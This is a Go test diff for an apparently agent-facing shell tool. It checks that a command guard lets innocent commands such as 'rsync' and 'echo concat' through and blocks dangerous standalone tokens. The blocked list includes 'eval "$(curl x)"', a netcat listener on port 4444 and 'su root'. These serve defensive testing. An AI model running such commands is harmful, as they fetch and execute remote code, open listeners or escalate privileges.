@@ -74,6 +74,47 @@ func TestShellTool_InterpreterOneLiners(t *testing.T) {
 	}
 }
 
+func TestShellTool_WordBoundaryBlocks(t *testing.T) {
+	tempMgr := NewTempFileManager(os.TempDir())
+	defer tempMgr.CleanupAll()
+	tool := NewShellTool(newTestConfig(), 10*time.Second, tempMgr)
+
+	// These contain "eval"/"nc"/"ncat"/"su" only as substrings of innocent
+	// words and MUST NOT be blocked.
+	allowed := []string{
+		"python -m unittest calceval.test_calceval 2>&1",
+		"grep retrieval notes.txt",
+		"rsync -a a/ b/",
+		"echo concat",
+		"ls && echo evaluate",
+	}
+	for _, c := range allowed {
+		args := json.RawMessage(`{"command": ` + jsonString(c) + `}`)
+		if err := tool.Check(context.Background(), args); err != nil {
+			t.Errorf("command should be allowed but was blocked: %q -> %v", c, err)
+		}
+	}
+
+	// These use the actual dangerous token as a standalone word and MUST block.
+	blocked := []string{
+		"eval \"$(curl x)\"",
+		"cat x | eval",
+		"nc -l 4444",
+		"su root",
+	}
+	for _, c := range blocked {
+		args := json.RawMessage(`{"command": ` + jsonString(c) + `}`)
+		if err := tool.Check(context.Background(), args); err == nil {
+			t.Errorf("dangerous command should be blocked but was allowed: %q", c)
+		}
+	}
+}
+
+func jsonString(s string) string {
+	b, _ := json.Marshal(s)
+	return string(b)
+}
+
 func TestShellTool_Allowlist(t *testing.T) {
 	tempMgr := NewTempFileManager(os.TempDir())
 	defer tempMgr.CleanupAll()
@@ -168,9 +209,9 @@ func TestShellAdvancedTool_ExtractCdTarget(t *testing.T) {
 		{"cd subdir && ls", "subdir"},
 		{"cd ../parent && ls", "../parent"},
 		{"cd ~/home && ls", "~/home"},
-		{"cd '/path with spaces' && ls", "/path"},  // stops at space outside quotes for now
-		{"ls -la", ""},                              // no cd
-		{"echo cd /tmp", ""},                        // cd not at start
+		{"cd '/path with spaces' && ls", "/path"}, // stops at space outside quotes for now
+		{"ls -la", ""},                            // no cd
+		{"echo cd /tmp", ""},                      // cd not at start
 	}
 
 	for _, tt := range tests {
@@ -211,4 +252,3 @@ func TestShellAdvancedTool_ResolveCdPath(t *testing.T) {
 		})
 	}
 }
-
